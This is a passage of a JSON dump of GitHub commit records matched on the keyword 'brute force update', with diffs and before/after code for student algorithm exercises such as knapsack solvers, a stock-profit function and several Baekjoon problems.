set1 = BruteForce.__knapSack(mW-w[n-1], w, v, n-1)\n+        set2 = BruteForce.__knapSack(mW, w, v, n-1)\n \n-if __name__ == '__main__':\n-    __main()\n+        if (set1[0]+v[n-1] > set2[0]):\n+            set1[1].append(n-1)\n+            set1[0] += v[n-1]\n+            return set1\n+        else:\n+            return set2\n\\ No newline at end of file\n","files":{"\/Algorithms\/Algorithms.py":{"changes":[{"diff":" DynamicPrograming = DynamicPrograming\n GreedyProgram = GreedyProgram\n Backtrack = Backtrack\n-BranchAndBound = BranchAndBound\n\\ No newline at end of file\n+BranchAndBound = BranchAndBound\n+BruteForce = BruteForce\n\\ No newline at end of file","add":2,"remove":1,"filename":"\/Algorithms\/Algorithms.py","badparts":["BranchAndBound = BranchAndBound"],"goodparts":["BranchAndBound = BranchAndBound","BruteForce = BruteForce"]}],"source":"\n\nimport sys import os from Algorithms.BranchAndBound import BranchAndBound SCRIPT_DIR=os.path.dirname(os.path.abspath(__file__)) sys.path.append(os.path.dirname(SCRIPT_DIR)) from.DynamicPrograming import DynamicPrograming from.Greedy import GreedyProgram from.Backtrack import Backtrack DynamicPrograming=DynamicPrograming GreedyProgram=GreedyProgram Backtrack=Backtrack BranchAndBound=BranchAndBound ","sourceWithComments":"\nimport sys\nimport os\n\nfrom Algorithms.BranchAndBound import BranchAndBound\nSCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))\nsys.path.append(os.path.dirname(SCRIPT_DIR))\n\nfrom .DynamicPrograming import DynamicPrograming\nfrom .Greedy import GreedyProgram\nfrom .Backtrack import Backtrack\n\n\nDynamicPrograming = DynamicPrograming\nGreedyProgram = GreedyProgram\nBacktrack = Backtrack\nBranchAndBound = BranchAndBound"},"\/Algorithms\/Backtrack.py":{"changes":[{"diff":"\n     @staticmethod\n     def findSolution(C : int, W : List[int], P : List[int]) -> List[int]:\n         '''\n-        Find a solution of knapsack problem using Dynamic Programing algorithms\n+        Find a solution of knapsack problem using Backtrack algorithms\n \n         @Parameters:\n         ----------\n","add":1,"remove":1,"filename":"\/Algorithms\/Backtrack.py","badparts":["        Find a solution of knapsack problem using Dynamic Programing algorithms","---------"],"goodparts":["        Find a solution of knapsack problem using Backtrack algorithms"]},{"diff":"\n             return [0, []]\n \n         if (w[n-1] > mW):\n-            return Backtrack.__knapSack(mW, w, v, n-1)\n+            return [0, []]\n \n         set1 = Backtrack.__knapSack(mW-w[n-1], w, v, n-1)\n         set2 = Backtrack.__knapSack(mW, w, v, n-1","add":1,"remove":1,"filename":"\/Algorithms\/Backtrack.py","badparts":["            return Backtrack.__knapSack(mW, w, v, n-1)"],"goodparts":["            return [0, []]"]}],"source":"\nfrom typing import List class Backtrack: @staticmethod def findSolution(C: int, W: List[int], P: List[int]) -> List[int]: ''' Find a solution of knapsack problem using Dynamic Programing algorithms @Parameters: ---------- -C: weight of knapsack -W: list weight of items -P: list price of items @Return ---------- List indexes of selected items ''' n=len(W) result=Backtrack.__knapSack(C, W, P, n) return result[1] @staticmethod def __knapSack(mW: int, w, v, n): if(mW==0 or n==0): return[0,[]] if(w[n-1] > mW): return Backtrack.__knapSack(mW, w, v, n-1) set1=Backtrack.__knapSack(mW-w[n-1], w, v, n-1) set2=Backtrack.__knapSack(mW, w, v, n-1) if(set1[0]+v[n-1] > set2[0]): set1[1].append(n-1) set1[0] +=v[n-1] return set1 else: return set2 ","sourceWithComments":"from typing import List\n\n\nclass Backtrack:\n\n    @staticmethod\n    def findSolution(C : int, W : List[int], P : List[int]) -> List[int]:\n        '''\n        Find a solution of knapsack problem using Dynamic Programing algorithms\n\n        @Parameters:\n        ----------\n            - C : weight of knapsack\n            - W : list weight of items\n            - P : list price of items\n\n        @Return\n        ----------\n        List indexes of selected items\n        '''\n\n        # Number of items\n        n = len(W)\n        result = Backtrack.__knapSack(C, W, P, n)\n\n        return result[1]\n\n    @staticmethod\n    def __knapSack(mW: int, w, v, n):\n\n        if (mW == 0 or n == 0):\n            return [0, []]\n\n        if (w[n-1] > mW):\n            return Backtrack.__knapSack(mW, w, v, n-1)\n\n        set1 = Backtrack.__knapSack(mW-w[n-1], w, v, n-1)\n        set2 = Backtrack.__knapSack(mW, w, v, n-1)\n\n        if (set1[0]+v[n-1] > set2[0]):\n            set1[1].append(n-1)\n            set1[0] += v[n-1]\n            return set1\n        else:\n            return set2"},"\/Algorithms\/BruteForce.py":{"changes":[{"diff":"\n from typing import List\n-import itertools\n-\n-\n-def __main():\n-    P = [60, 100, 140, 200]\n-    W = [10, 20, 30, 40]\n-    C = 70\n-    print(BruteForce.findSolution(C, W, P))\n \n \n class BruteForce:\n+\n     @staticmethod\n-    def findSolution(C: int, W: List[int], P: List[int]) -> List[int]:\n+    def findSolution(C : int, W : List[int], P : List[int]) -> List[int]:\n+        '''\n+        Find a solution of knapsack problem using Brute Force algorithms\n+\n+        @Parameters:\n+        ----------\n+            - C : weight of knapsack\n+            - W : list weight of items\n+            - P : list price of items\n+\n+        @Return\n+        ----------\n+        List indexes of selected items\n+        '''\n+\n+        # Number of items\n         n = len(W)\n-        max_P = BruteForce.__algorithm(C, W, P, n)\n+        result = BruteForce.__knapSack(C, W, P, n)\n \n-        return BruteForce.__result(P, max_P)\n+        return result[1]\n \n     @staticmethod\n-    def __algorithm(C, W, P, n):\n-        if n == 0 or C == 0:\n-            return 0\n-\n-        # If weight of the nth item is\n-        # more than Knapsack of capacity W,\n-        # then this item cannot be included\n-        # in the optimal solution\n-        if (W[n-1] > C):\n-            return BruteForce.__algorithm(C, W, P, n-1)\n-\n-        # return the maximum of two cases:\n-        # (1) nth item included\n-        # (2) not included\n-        else:\n-            return max(\n-                P[n-1] + BruteForce.__algorithm(C-W[n-1], W, P, n-1),\n-                BruteForce.__algorithm(C, W, P, n-1))\n+    def __knapSack(mW: int, w, v, n):\n \n-    @staticmethod\n-    def __result(P: List[int], mP: int):\n-        # for i in range(len(P)):\n-        #     for j in itertools.combinations(P, i):\n-        #         if (sum(j) == mP):\n-        #             return [P.index(i) for i in j]\n-        return []\n+        if (mW == 0 or n == 0):\n+            return [0, []]\n+\n+        if (w[n-1] > mW):\n+            return BruteForce.__knapSack(mW, w, v, n-1)\n \n+        set1 = BruteForce.__knapSack(mW-w[n-1], w, v, n-1)\n+        set2 = BruteForce.__knapSack(mW, w, v, n-1)\n \n-if __name__ == '__main__':\n-    __main()\n+        if (set1[0]+v[n-1] > set2[0]):\n+            set1[1].append(n-1)\n+            set1[0] += v[n-1]\n+            return set1\n+        else:\n+            return set2\n\\ No newline at end of file\n","add":33,"remove":38,"filename":"\/Algorithms\/BruteForce.py","badparts":["import itertools","def __main():","    P = [60, 100, 140, 200]","    W = [10, 20, 30, 40]","    C = 70","    print(BruteForce.findSolution(C, W, P))","    def findSolution(C: int, W: List[int], P: List[int]) -> List[int]:","        max_P = BruteForce.__algorithm(C, W, P, n)","        return BruteForce.__result(P, max_P)","    def __algorithm(C, W, P, n):","        if n == 0 or C == 0:","            return 0","        if (W[n-1] > C):","            return BruteForce.__algorithm(C, W, P, n-1)","        else:","            return max(","                P[n-1] + BruteForce.__algorithm(C-W[n-1], W, P, n-1),","                BruteForce.__algorithm(C, W, P, n-1))","    @staticmethod","    def __result(P: List[int], mP: int):","        return []","if __name__ == '__main__':","    __main()"],"goodparts":["    def findSolution(C : int, W : List[int], P : List[int]) -> List[int]:","        '''","        Find a solution of knapsack problem using Brute Force algorithms","        @Parameters:","        ----------","            - C : weight of knapsack","            - W : list weight of items","            - P : list price of items","        @Return","        ----------","        List indexes of selected items","        '''","        result = BruteForce.__knapSack(C, W, P, n)","        return result[1]","    def __knapSack(mW: int, w, v, n):","        if (mW == 0 or n == 0):","            return [0, []]","        if (w[n-1] > mW):","            return BruteForce.__knapSack(mW, w, v, n-1)","        set1 = BruteForce.__knapSack(mW-w[n-1], w, v, n-1)","        set2 = BruteForce.__knapSack(mW, w, v, n-1)","        if (set1[0]+v[n-1] > set2[0]):","            set1[1].append(n-1)","            set1[0] += v[n-1]","            return set1","        else:","            return set2"]}],"source":"\nfrom typing import List import itertools def __main(): P=[60, 100, 140, 200] W=[10, 20, 30, 40] C=70 print(BruteForce.findSolution(C, W, P)) class BruteForce: @staticmethod def findSolution(C: int, W: List[int], P: List[int]) -> List[int]: n=len(W) max_P=BruteForce.__algorithm(C, W, P, n) return BruteForce.__result(P, max_P) @staticmethod def __algorithm(C, W, P, n): if n==0 or C==0: return 0 if(W[n-1] > C): return BruteForce.__algorithm(C, W, P, n-1) else: return max( P[n-1] +BruteForce.__algorithm(C-W[n-1], W, P, n-1), BruteForce.__algorithm(C, W, P, n-1)) @staticmethod def __result(P: List[int], mP: int): return[] if __name__=='__main__': __main() ","sourceWithComments":"from typing import List\nimport itertools\n\n\ndef __main():\n    P = [60, 100, 140, 200]\n    W = [10, 20, 30, 40]\n    C = 70\n    print(BruteForce.findSolution(C, W, P))\n\n\nclass BruteForce:\n    @staticmethod\n    def findSolution(C: int, W: List[int], P: List[int]) -> List[int]:\n        n = len(W)\n        max_P = BruteForce.__algorithm(C, W, P, n)\n\n        return BruteForce.__result(P, max_P)\n\n    @staticmethod\n    def __algorithm(C, W, P, n):\n        if n == 0 or C == 0:\n            return 0\n\n        # If weight of the nth item is\n        # more than Knapsack of capacity W,\n        # then this item cannot be included\n        # in the optimal solution\n        if (W[n-1] > C):\n            return BruteForce.__algorithm(C, W, P, n-1)\n\n        # return the maximum of two cases:\n        # (1) nth item included\n        # (2) not included\n        else:\n            return max(\n                P[n-1] + BruteForce.__algorithm(C-W[n-1], W, P, n-1),\n                BruteForce.__algorithm(C, W, P, n-1))\n\n    @staticmethod\n    def __result(P: List[int], mP: int):\n        # for i in range(len(P)):\n        #     for j in itertools.combinations(P, i):\n        #         if (sum(j) == mP):\n        #             return [P.index(i) for i in j]\n        return []\n\n\nif __name__ == '__main__':\n    __main()\n"}},"msg":"Update Brute Force and Backtrack algorithm"}},"https:\/\/github.com\/niduttnb\/StockMarket-profit-maximization":{"008c4be73be722d3efa1a2822fa3a9f7a6fa0684":{"url":"https:\/\/api.github.com\/repos\/niduttnb\/StockMarket-profit-maximization\/commits\/008c4be73be722d3efa1a2822fa3a9f7a6fa0684","html_url":"https:\/\/github.com\/niduttnb\/StockMarket-profit-maximization\/commit\/008c4be73be722d3efa1a2822fa3a9f7a6fa0684","message":"Update brute_force.py","sha":"008c4be73be722d3efa1a2822fa3a9f7a6fa0684","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex 6fe5218..04c055b 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -1,31 +1,20 @@\n def brute_force(prices):\r\n-        pro = dict()\r\n-            \r\n-        while prices[-1] == 0:\r\n-            prices.pop()\r\n+    return calculate(prices, 0)\r\n         \r\n-    \r\n-        def get_Max_Profit(s, sell):\r\n-            if s == len(prices):\r\n-                return 0\r\n-            \r\n-            if sell * s in pro:\r\n-                return pro[sell * s]\r\n-            \r\n-            max_Profit = 0\r\n-            for j in range(s, len(prices)):\r\n-                next = j + 1\r\n-                \r\n-                if sell == -1:\r\n-                    while next < len(prices) and prices[next] <= prices[j]: next += 1\r\n+def calculate(prices, n):\r\n+    if n >= len(prices):\r\n+        return 0\r\n \r\n-                profit =  get_Max_Profit(next, -1 * sell) +  sell * prices[j]\r\n-                \r\n-                if profit > max_Profit:\r\n-                    max_Profit = profit\r\n-                    \r\n-            pro[sell * s] = max_Profit\r\n-            \r\n-            return max_Profit\r\n-        \r\n-        return get_Max_Profit(0, -1)\n\\ No newline at end of file\n+    max_profit = 0\r\n+    for i in range(n, len(prices)):\r\n+        max_value = 0\r\n+        for j in range(i+1, len(prices)):\r\n+            if prices[i] < prices[j]:\r\n+                profit = calculate(prices, j + 1) + prices[j] \/\r\n+                         - prices[i]\r\n+                if profit > max_value:\r\n+                    max_value = profit\r\n+        if max_value > max_profit:\r\n+            max_profit = max_value\r\n+\r\n+    return max_profit\r\n","files":{"\/brute_force.py":{"changes":[{"diff":"\n def brute_force(prices):\r\n-        pro = dict()\r\n-            \r\n-        while prices[-1] == 0:\r\n-            prices.pop()\r\n+    return calculate(prices, 0)\r\n         \r\n-    \r\n-        def get_Max_Profit(s, sell):\r\n-            if s == len(prices):\r\n-                return 0\r\n-            \r\n-            if sell * s in pro:\r\n-                return pro[sell * s]\r\n-            \r\n-            max_Profit = 0\r\n-            for j in range(s, len(prices)):\r\n-                next = j + 1\r\n-                \r\n-                if sell == -1:\r\n-                    while next < len(prices) and prices[next] <= prices[j]: next += 1\r\n+def calculate(prices, n):\r\n+    if n >= len(prices):\r\n+        return 0\r\n \r\n-                profit =  get_Max_Profit(next, -1 * sell) +  sell * prices[j]\r\n-                \r\n-                if profit > max_Profit:\r\n-                    max_Profit = profit\r\n-                    \r\n-            pro[sell * s] = max_Profit\r\n-            \r\n-            return max_Profit\r\n-        \r\n-        return get_Max_Profit(0, -1)\n\\ No newline at end of file\n+    max_profit = 0\r\n+    for i in range(n, len(prices)):\r\n+        max_value = 0\r\n+        for j in range(i+1, len(prices)):\r\n+            if prices[i] < prices[j]:\r\n+                profit = calculate(prices, j + 1) + prices[j] \/\r\n+                         - prices[i]\r\n+                if profit > max_value:\r\n+                    max_value = profit\r\n+        if max_value > max_profit:\r\n+            max_profit = max_value\r\n+\r\n+    return max_profit\r\n","add":17,"remove":28,"filename":"\/brute_force.py","badparts":["        pro = dict()\r","            \r","        while prices[-1] == 0:\r","            prices.pop()\r","    \r","        def get_Max_Profit(s, sell):\r","            if s == len(prices):\r","                return 0\r","            \r","            if sell * s in pro:\r","                return pro[sell * s]\r","            \r","            max_Profit = 0\r","            for j in range(s, len(prices)):\r","                next = j + 1\r","                \r","                if sell == -1:\r","                    while next < len(prices) and prices[next] <= prices[j]: next += 1\r","                profit =  get_Max_Profit(next, -1 * sell) +  sell * prices[j]\r","                \r","                if profit > max_Profit:\r","                    max_Profit = profit\r","                    \r","            pro[sell * s] = max_Profit\r","            \r","            return max_Profit\r","        \r","        return get_Max_Profit(0, -1)"],"goodparts":["    return calculate(prices, 0)\r","def calculate(prices, n):\r","    if n >= len(prices):\r","        return 0\r","    max_profit = 0\r","    for i in range(n, len(prices)):\r","        max_value = 0\r","        for j in range(i+1, len(prices)):\r","            if prices[i] < prices[j]:\r","                profit = calculate(prices, j + 1) + prices[j] \/\r","                         - prices[i]\r","                if profit > max_value:\r","                    max_value = profit\r","        if max_value > max_profit:\r","            max_profit = max_value\r","\r","    return max_profit\r"]}],"source":"\ndef brute_force(prices):\r pro=dict()\r \r while prices[-1]==0:\r prices.pop()\r \r \r def get_Max_Profit(s, sell):\r if s==len(prices):\r return 0\r \r if sell * s in pro:\r return pro[sell * s]\r \r max_Profit=0\r for j in range(s, len(prices)):\r next=j +1\r \r if sell==-1:\r while next < len(prices) and prices[next] <=prices[j]: next +=1\r \r profit= get_Max_Profit(next, -1 * sell) + sell * prices[j]\r \r if profit > max_Profit:\r max_Profit=profit\r \r pro[sell * s]=max_Profit\r \r return max_Profit\r \r return get_Max_Profit(0, -1) ","sourceWithComments":"def brute_force(prices):\r\n        pro = dict()\r\n            \r\n        while prices[-1] == 0:\r\n            prices.pop()\r\n        \r\n    \r\n        def get_Max_Profit(s, sell):\r\n            if s == len(prices):\r\n                return 0\r\n            \r\n            if sell * s in pro:\r\n                return pro[sell * s]\r\n            \r\n            max_Profit = 0\r\n            for j in range(s, len(prices)):\r\n                next = j + 1\r\n                \r\n                if sell == -1:\r\n                    while next < len(prices) and prices[next] <= prices[j]: next += 1\r\n\r\n                profit =  get_Max_Profit(next, -1 * sell) +  sell * prices[j]\r\n                \r\n                if profit > max_Profit:\r\n                    max_Profit = profit\r\n                    \r\n            pro[sell * s] = max_Profit\r\n            \r\n            return max_Profit\r\n        \r\n        return get_Max_Profit(0, -1)"}},"msg":"Update brute_force.py"}},"https:\/\/github.com\/sodabeans\/Algorithm":{"1465bb532394c6a9aaaf60245892e39551460f9a":{"url":"https:\/\/api.github.com\/repos\/sodabeans\/Algorithm\/commits\/1465bb532394c6a9aaaf60245892e39551460f9a","html_url":"https:\/\/github.com\/sodabeans\/Algorithm\/commit\/1465bb532394c6a9aaaf60245892e39551460f9a","sha":"1465bb532394c6a9aaaf60245892e39551460f9a","keyword":"brute force update","diff":"diff --git a\/Baekjoon\/14501.py b\/Baekjoon\/14501.py\nindex 4cd3c59..7edfb16 100644\n--- a\/Baekjoon\/14501.py\n+++ b\/Baekjoon\/14501.py\n@@ -4,21 +4,17 @@\n N = int(input())\n time = []\n price = []\n-dp = [0 for _ in range(N)]\n+dp = [0 for _ in range(N + 1)]\n \n for i in range(N):\n     t, p = map(int, input().split())\n     time.append(t)\n     price.append(p)\n \n-for i in range(1, N):\n-    if time[i] + i < N:\n-        dp[time[i] + i] = max(dp[time[i] + i - 1], price[i] + dp[i - 1])\n-    elif time[i] == 1:\n-        dp[i] = max(dp[i], dp[i - 1] + price[i])\n+for i in range(N - 1, -1, -1):\n+    if time[i] + i > N:\n+        dp[i] = dp[i + 1]\n+    else:\n+        dp[i] = max(dp[time[i] + i] + price[i], dp[i + 1])\n \n-print(dp)\n-# ans = max(dp)\n-# if time[-1] == 1:\n-#     ans += price[-1]\n-# print(ans)\n\\ No newline at end of file\n+print(dp[0])\n","message":"","files":{"\/Baekjoon\/14501.py":{"changes":[{"diff":"\n N = int(input())\n time = []\n price = []\n-dp = [0 for _ in range(N)]\n+dp = [0 for _ in range(N + 1)]\n \n for i in range(N):\n     t, p = map(int, input().split())\n     time.append(t)\n     price.append(p)\n \n-for i in range(1, N):\n-    if time[i] + i < N:\n-        dp[time[i] + i] = max(dp[time[i] + i - 1], price[i] + dp[i - 1])\n-    elif time[i] == 1:\n-        dp[i] = max(dp[i], dp[i - 1] + price[i])\n+for i in range(N - 1, -1, -1):\n+    if time[i] + i > N:\n+        dp[i] = dp[i + 1]\n+    else:\n+        dp[i] = max(dp[time[i] + i] + price[i], dp[i + 1])\n \n-print(dp)\n-# ans = max(dp)\n-# if time[-1] == 1:\n-#     ans += price[-1]\n-# print(ans)\n\\ No newline at end of file\n+print(dp[0])\n","add":7,"remove":11,"filename":"\/Baekjoon\/14501.py","badparts":["dp = [0 for _ in range(N)]","for i in range(1, N):","    if time[i] + i < N:","        dp[time[i] + i] = max(dp[time[i] + i - 1], price[i] + dp[i - 1])","    elif time[i] == 1:","        dp[i] = max(dp[i], dp[i - 1] + price[i])","print(dp)"],"goodparts":["dp = [0 for _ in range(N + 1)]","for i in range(N - 1, -1, -1):","    if time[i] + i > N:","        dp[i] = dp[i + 1]","    else:","        dp[i] = max(dp[time[i] + i] + price[i], dp[i + 1])","print(dp[0])"]}],"source":"\nimport sys input=sys.stdin.readline N=int(input()) time=[] price=[] dp=[0 for _ in range(N)] for i in range(N): t, p=map(int, input().split()) time.append(t) price.append(p) for i in range(1, N): if time[i] +i < N: dp[time[i] +i]=max(dp[time[i] +i -1], price[i] +dp[i -1]) elif time[i]==1: dp[i]=max(dp[i], dp[i -1] +price[i]) print(dp) ","sourceWithComments":"import sys\ninput = sys.stdin.readline\n\nN = int(input())\ntime = []\nprice = []\ndp = [0 for _ in range(N)]\n\nfor i in range(N):\n    t, p = map(int, input().split())\n    time.append(t)\n    price.append(p)\n\nfor i in range(1, N):\n    if time[i] + i < N:\n        dp[time[i] + i] = max(dp[time[i] + i - 1], price[i] + dp[i - 1])\n    elif time[i] == 1:\n        dp[i] = max(dp[i], dp[i - 1] + price[i])\n\nprint(dp)\n# ans = max(dp)\n# if time[-1] == 1:\n#     ans += price[-1]\n# print(ans)"}},"msg":"[DP, Brute Force] \"\ud1f4\uc0ac\" 14501 (Update)"},"7caeeb57628155fb7582870e68dc7eeee0facfb8":{"url":"https:\/\/api.github.com\/repos\/sodabeans\/Algorithm\/commits\/7caeeb57628155fb7582870e68dc7eeee0facfb8","html_url":"https:\/\/github.com\/sodabeans\/Algorithm\/commit\/7caeeb57628155fb7582870e68dc7eeee0facfb8","sha":"7caeeb57628155fb7582870e68dc7eeee0facfb8","keyword":"brute force update","diff":"diff --git a\/Baekjoon\/2022 03 March\/18111.py b\/Baekjoon\/2022 03 March\/18111.py\nindex 42bb453..caafd0c 100644\n--- a\/Baekjoon\/2022 03 March\/18111.py\t\n+++ b\/Baekjoon\/2022 03 March\/18111.py\t\n@@ -1,43 +1,26 @@\n import sys\n input = sys.stdin.readline\n \n-N, M, B = map(int, input().split())\n+N, M, B = map(int, input().split())  # row, column, blocks\n+ground = list(list(map(int, input().split())) for _ in range(N))  # starting ground heights\n+\n+ans_time = 1000000000\n+ans_height = 0\n+\n+for curr_height in range(257):  # maximum height is 256\n+    remove_cnt = 0\n+    add_cnt = 0\n+    for i in range(N):\n+        for j in range(M):\n+            if ground[i][j] > curr_height:  # remove. add to inventory. 2 sec\n+                remove_cnt += ground[i][j] - curr_height\n+            else:  # add. remove from inventory. 1 sec\n+                add_cnt -= ground[i][j] - curr_height  # negative number, so subtract\n+\n+    if remove_cnt + B >= add_cnt:\n+        curr_time = remove_cnt * 2 + add_cnt\n+        if curr_time <= ans_time:  # if time is shorter or same\n+            ans_height = curr_height   # if same time, answer should update to higher height\n+            ans_time = curr_time\n \n-heights = [list(map(int, input().rstrip().split())) for _ in range(N)]\n-heights = sum(heights, [])\n-\n-heights.sort()\n-curr_height = heights[0]\n-max_height = heights[-1]\n-changes = list()\n-\n-\"\"\"\n-for i in range(N):\n-    field.append(list(map(int, input().split())))\n-    if min(field[i]) < min_h:\n-        min_h = min(field[i])\n-    if max(field[i]) > max_h:\n-        max_h = max(field[i])\n-\"\"\"\n-\n-while curr_height <= max_height:\n-    inventory = B\n-    change_cnt = 0\n-    time = 0\n-    for i in range(N * M):\n-        if heights[i] > curr_height:\n-            inventory = inventory + heights[i] - curr_height\n-            time += 2\n-        elif heights[i] < curr_height:\n-            inventory = inventory - (heights[i] - curr_height)\n-            time += 1\n-\n-    if inventory >= 0:\n-        changes.append((time, curr_height))\n-    curr_height += 1\n-\n-changes.sort()\n-\n-ans_time, ans_height = changes[0]\n print(f'{ans_time} {ans_height}')\n-\n","message":"","files":{"\/Baekjoon\/2022 03 March\/18111.py":{"changes":[{"diff":"\n import sys\n input = sys.stdin.readline\n \n-N, M, B = map(int, input().split())\n+N, M, B = map(int, input().split())  # row, column, blocks\n+ground = list(list(map(int, input().split())) for _ in range(N))  # starting ground heights\n+\n+ans_time = 1000000000\n+ans_height = 0\n+\n+for curr_height in range(257):  # maximum height is 256\n+    remove_cnt = 0\n+    add_cnt = 0\n+    for i in range(N):\n+        for j in range(M):\n+            if ground[i][j] > curr_height:  # remove. add to inventory. 2 sec\n+                remove_cnt += ground[i][j] - curr_height\n+            else:  # add. remove from inventory. 1 sec\n+                add_cnt -= ground[i][j] - curr_height  # negative number, so subtract\n+\n+    if remove_cnt + B >= add_cnt:\n+        curr_time = remove_cnt * 2 + add_cnt\n+        if curr_time <= ans_time:  # if time is shorter or same\n+            ans_height = curr_height   # if same time, answer should update to higher height\n+            ans_time = curr_time\n \n-heights = [list(map(int, input().rstrip().split())) for _ in range(N)]\n-heights = sum(heights, [])\n-\n-heights.sort()\n-curr_height = heights[0]\n-max_height = heights[-1]\n-changes = list()\n-\n-\"\"\"\n-for i in range(N):\n-    field.append(list(map(int, input().split())))\n-    if min(field[i]) < min_h:\n-        min_h = min(field[i])\n-    if max(field[i]) > max_h:\n-        max_h = max(field[i])\n-\"\"\"\n-\n-while curr_height <= max_height:\n-    inventory = B\n-    change_cnt = 0\n-    time = 0\n-    for i in range(N * M):\n-        if heights[i] > curr_height:\n-            inventory = inventory + heights[i] - curr_height\n-            time += 2\n-        elif heights[i] < curr_height:\n-            inventory = inventory - (heights[i] - curr_height)\n-            time += 1\n-\n-    if inventory >= 0:\n-        changes.append((time, curr_height))\n-    curr_height += 1\n-\n-changes.sort()\n-\n-ans_time, ans_height = changes[0]\n print(f'{ans_time} {ans_height}')\n-\n","add":21,"remove":38,"filename":"\/Baekjoon\/2022 03 March\/18111.py","badparts":["N, M, B = map(int, input().split())","heights = [list(map(int, input().rstrip().split())) for _ in range(N)]","heights = sum(heights, [])","heights.sort()","curr_height = heights[0]","max_height = heights[-1]","changes = list()","\"\"\"","for i in range(N):","    field.append(list(map(int, input().split())))","    if min(field[i]) < min_h:","        min_h = min(field[i])","    if max(field[i]) > max_h:","        max_h = max(field[i])","\"\"\"","while curr_height <= max_height:","    inventory = B","    change_cnt = 0","    time = 0","    for i in range(N * M):","        if heights[i] > curr_height:","            inventory = inventory + heights[i] - curr_height","            time += 2","        elif heights[i] < curr_height:","            inventory = inventory - (heights[i] - curr_height)","            time += 1","    if inventory >= 0:","        changes.append((time, curr_height))","    curr_height += 1","changes.sort()","ans_time, ans_height = changes[0]"],"goodparts":["N, M, B = map(int, input().split())  # row, column, blocks","ground = list(list(map(int, input().split())) for _ in range(N))  # starting ground heights","ans_time = 1000000000","ans_height = 0","for curr_height in range(257):  # maximum height is 256","    remove_cnt = 0","    add_cnt = 0","    for i in range(N):","        for j in range(M):","            if ground[i][j] > curr_height:  # remove. add to inventory. 2 sec","                remove_cnt += ground[i][j] - curr_height","            else:  # add. remove from inventory. 1 sec","                add_cnt -= ground[i][j] - curr_height  # negative number, so subtract","    if remove_cnt + B >= add_cnt:","        curr_time = remove_cnt * 2 + add_cnt","        if curr_time <= ans_time:  # if time is shorter or same","            ans_height = curr_height   # if same time, answer should update to higher height","            ans_time = curr_time"]}],"source":"\nimport sys input=sys.stdin.readline N, M, B=map(int, input().split()) heights=[list(map(int, input().rstrip().split())) for _ in range(N)] heights=sum(heights,[]) heights.sort() curr_height=heights[0] max_height=heights[-1] changes=list() \"\"\" for i in range(N): field.append(list(map(int, input().split()))) if min(field[i]) < min_h: min_h=min(field[i]) if max(field[i]) > max_h: max_h=max(field[i]) \"\"\" while curr_height <=max_height: inventory=B change_cnt=0 time=0 for i in range(N * M): if heights[i] > curr_height: inventory=inventory +heights[i] -curr_height time +=2 elif heights[i] < curr_height: inventory=inventory -(heights[i] -curr_height) time +=1 if inventory >=0: changes.append((time, curr_height)) curr_height +=1 changes.sort() ans_time, ans_height=changes[0] print(f'{ans_time}{ans_height}') ","sourceWithComments":"import sys\ninput = sys.stdin.readline\n\nN, M, B = map(int, input().split())\n\nheights = [list(map(int, input().rstrip().split())) for _ in range(N)]\nheights = sum(heights, [])\n\nheights.sort()\ncurr_height = heights[0]\nmax_height = heights[-1]\nchanges = list()\n\n\"\"\"\nfor i in range(N):\n    field.append(list(map(int, input().split())))\n    if min(field[i]) < min_h:\n        min_h = min(field[i])\n    if max(field[i]) > max_h:\n        max_h = max(field[i])\n\"\"\"\n\nwhile curr_height <= max_height:\n    inventory = B\n    change_cnt = 0\n    time = 0\n    for i in range(N * M):\n        if heights[i] > curr_height:\n            inventory = inventory + heights[i] - curr_height\n            time += 2\n        elif heights[i] < curr_height:\n            inventory = inventory - (heights[i] - curr_height)\n            time += 1\n\n    if inventory >= 0:\n        changes.append((time, curr_height))\n    curr_height += 1\n\nchanges.sort()\n\nans_time, ans_height = changes[0]\nprint(f'{ans_time} {ans_height}')\n\n"}},"msg":"[Brute Force] \"\ub9c8\uc778\ud06c\ub798\ud504\ud2b8\" 18111 (Update)"},"c2afa457f54c35f82659daea1980a55ed49fb78d":{"url":"https:\/\/api.github.com\/repos\/sodabeans\/Algorithm\/commits\/c2afa457f54c35f82659daea1980a55ed49fb78d","html_url":"https:\/\/github.com\/sodabeans\/Algorithm\/commit\/c2afa457f54c35f82659daea1980a55ed49fb78d","sha":"c2afa457f54c35f82659daea1980a55ed49fb78d","keyword":"brute force update","diff":"diff --git a\/Baekjoon\/21735.py b\/Baekjoon\/21735.py\nindex f727dde..d07eece 100644\n--- a\/Baekjoon\/21735.py\n+++ b\/Baekjoon\/21735.py\n@@ -13,9 +13,9 @@ def dfs(idx, snowball, time):\n     else:\n         ans = max(snowball, ans)\n \n-    if idx < N - 1:\n+    if idx <= N - 1:\n         dfs(idx + 1, snowball + a[idx + 1], time + 1)\n-    if idx < N - 2:\n+    if idx <= N - 2:\n         dfs(idx + 2, snowball \/\/ 2 + a[idx + 2], time + 1)\n \n \n","message":"","files":{"\/Baekjoon\/21735.py":{"changes":[{"diff":"\n     else:\n         ans = max(snowball, ans)\n \n-    if idx < N - 1:\n+    if idx <= N - 1:\n         dfs(idx + 1, snowball + a[idx + 1], time + 1)\n-    if idx < N - 2:\n+    if idx <= N - 2:\n         dfs(idx + 2, snowball \/\/ 2 + a[idx + 2], time + 1)\n \n \n","add":2,"remove":2,"filename":"\/Baekjoon\/21735.py","badparts":["    if idx < N - 1:","    if idx < N - 2:"],"goodparts":["    if idx <= N - 1:","    if idx <= N - 2:"]}],"source":"\nimport sys input=sys.stdin.readline N, M=map(int, input().split()) a=[0] +list(map(int, input().split())) def dfs(idx, snowball, time): global ans if time > M: return else: ans=max(snowball, ans) if idx < N -1: dfs(idx +1, snowball +a[idx +1], time +1) if idx < N -2: dfs(idx +2, snowball \/\/ 2 +a[idx +2], time +1) ans=0 dfs(0, 1, 0) print(ans) ","sourceWithComments":"import sys\ninput = sys.stdin.readline\n\nN, M = map(int, input().split())\na = [0] + list(map(int, input().split()))  # starting position is 0\n\n\ndef dfs(idx, snowball, time):\n    global ans\n\n    if time > M:\n        return\n    else:\n        ans = max(snowball, ans)\n\n    if idx < N - 1:\n        dfs(idx + 1, snowball + a[idx + 1], time + 1)\n    if idx < N - 2:\n        dfs(idx + 2, snowball \/\/ 2 + a[idx + 2], time + 1)\n\n\nans = 0\ndfs(0, 1, 0)\nprint(ans)\n"}},"msg":"[Brute Force, Backtracking] \"\ub208\ub369\uc774 \uad74\ub9ac\uae30\" 21735 